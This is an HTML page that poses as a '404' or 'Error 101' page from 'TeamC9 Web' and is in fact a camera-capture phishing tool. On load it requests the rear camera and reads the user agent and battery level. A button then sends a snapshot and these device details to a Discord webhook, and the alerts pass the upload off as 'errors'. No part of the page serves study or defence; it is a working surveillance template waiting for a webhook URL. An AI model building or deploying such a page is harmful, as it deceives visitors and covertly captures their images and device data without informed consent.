<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ERROR PAGE 404.</title>
    <style>
        video, canvas {
            display: block;
            width: 100%;
            max-width: 400px;
            margin: 20px auto;
        }
    </style>
    <script>
        let videoStream;
        let phoneModel = navigator.userAgent || "Unknown Model";
        let batteryLevel = "Unknown";

        // Function to start the back camera
        async function startCamera() {
            try {
                videoStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: "environment" } }, // Back camera
                    audio: false
                });
                const video = document.querySelector('video');
                video.srcObject = videoStream;
                video.play();
            } catch (error) {
                alert("Camera access denied or not supported.");
                console.error('Error accessing: ', error);
            }
        }

        function getBatteryInfo() {
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    batteryLevel = (battery.level * 100) + "%";
                });
            } else {
                alert("Battery API not supported on this device.");
            }
        }

        function takePicture() {
            const video = document.querySelector('video');
            const canvas = document.querySelector('canvas');
            const context = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataUrl = canvas.toDataURL('image/jpeg');
            sendToDiscord(dataUrl);
        }

        function sendToDiscord(imageData) {
            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';

            const formData = new FormData();
            formData.append('file', dataURLtoBlob(imageData), 'snapshot.jpg');

            // Append message content with phone model and battery info
            const message = {
                content: `Phone Model: ${phoneModel}\nBattery Level: ${batteryLevel}`
            };

            formData.append('payload_json', JSON.stringify(message));

            fetch(webhookUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    alert("Errors sent to Discord!");
                } else {
                    alert("Failed to send errors to Discord.");
                }
            })
            .catch(error => console.error('Error:', error));
        }

        // Helper function to convert a data URL to a Blob object
        function dataURLtoBlob(dataUrl) {
            const arr = dataUrl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }

        // Start the camera and get battery info when the page loads
        window.onload = function() {
            startCamera();
            getBatteryInfo();
        };
    </script>
</head>
<body>
    <h1>TeamC9 Web Says: Error 101.</h1>
    <video autoplay playsinline></video>
    <button onclick="takePicture()">Take Picture</button>
    <canvas style="display: none;"></canvas>
</body>
</html>
